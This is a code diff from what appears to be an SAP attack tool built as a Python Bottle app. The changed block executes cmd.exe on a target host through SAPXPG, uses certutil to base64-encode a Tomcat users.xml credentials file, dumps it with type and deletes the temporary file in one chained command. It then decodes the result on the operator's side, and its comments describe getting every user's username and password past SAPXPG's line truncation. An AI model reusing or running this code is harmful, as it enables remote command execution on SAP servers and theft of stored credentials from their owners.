@@ -2010,29 +2010,52 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     # the username and password attributes directly —
                     # no PowerShell XML parsing, no quoting issues.
                     # Each attribute is on its own short output line.
-                    # Read the file via certutil base64 instead of findstr.
-                    # SAPXPG truncates each output line at ~128 bytes — Tomcat
-                    # saves users.xml as one long line with every <user>
-                    # element concatenated, so a findstr match returns the
-                    # whole line and SAPXPG drops everything past the first
-                    # ~128 chars (i.e. the first user).  certutil -encode
-                    # naturally wraps base64 at 64 chars per line, so the
-                    # full content survives reassembly on the Python side.
+                    # Read the file via certutil base64.  SAPXPG truncates
+                    # each output line at ~128 bytes — Tomcat saves users.xml
+                    # as one long line with every <user> element concatenated,
+                    # so a findstr match returns one line and SAPXPG drops
+                    # everything past ~128 chars (i.e. the first user).
+                    #
+                    # Use the same single-cmd chained pattern the SSFS reader
+                    # uses successfully: certutil -encode writes a base64 file,
+                    # `type` dumps it, `del` cleans up — all chained with &&
+                    # inside ONE cmd /c invocation so we get every output row
+                    # from `type` in the same SAPXPG LOG table.  Two separate
+                    # SAPXPG calls (one for certutil, one for `more`) lose
+                    # everything past the first ~2 rows on kernels that
+                    # don't honour MXROW.
                     import re as _re2
                     import base64 as _b64e
                     raw = None
-                    tmp = r"C:\Windows\Temp\.scc_users.b64"
-                    _gw("cmd.exe",
-                         f'/c certutil -encode "{fpath}" "{tmp}" 2>nul')
-                    cu_out, _ = _gw("cmd.exe", f'/c more "{tmp}"')
-                    _gw("cmd.exe", f'/c del /q "{tmp}" 2>nul')
-                    # Strip BEGIN/END CERTIFICATE markers and any non-base64
-                    # noise; certutil's output is wrapped in PEM-style banners.
-                    b64_text = "".join(
-                        _re2.findall(r'[A-Za-z0-9+/=]+', cu_out))
+                    tmp = r"%TEMP%\.scc_users.b64"
+                    chained = (
+                        f'/c certutil -encode "{fpath}" "{tmp}" && '
+                        f'type "{tmp}" && del "{tmp}"'
+                    )
+                    cu_out, _ = _gw("cmd.exe", chained)
+                    # Filter out certutil status lines + PEM markers, then
+                    # strip every non-base64 char from the remainder.
+                    b64_lines = []
+                    for line in (cu_out or "").splitlines():
+                        clean = line.strip()
+                        if not clean:
+                            continue
+                        if clean.startswith("-----"):
+                            continue   # PEM BEGIN/END CERTIFICATE markers
+                        if ("CertUtil" in clean or "Input Length" in clean
+                                or "Output Length" in clean):
+                            continue   # certutil progress output
+                        kept = "".join(
+                            c for c in clean
+                            if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                                    "abcdefghijklmnopqrstuvwxyz0123456789+/=")
+                        if kept:
+                            b64_lines.append(kept)
+                    b64_text = "".join(b64_lines)
                     print(f"[*] SCC {host}: certutil base64 → "
-                          f"{len(cu_out)}B, {len(b64_text)} b64 chars")
-                    if b64_text:
+                          f"{len(cu_out)}B raw, {len(b64_text)} b64 chars "
+                          f"({len(b64_lines)} lines)")
+                    if len(b64_text) >= 16:
                         try:
                             raw = _b64e.b64decode(b64_text)
                             print(f"[*] SCC {host}: decoded users.xml "
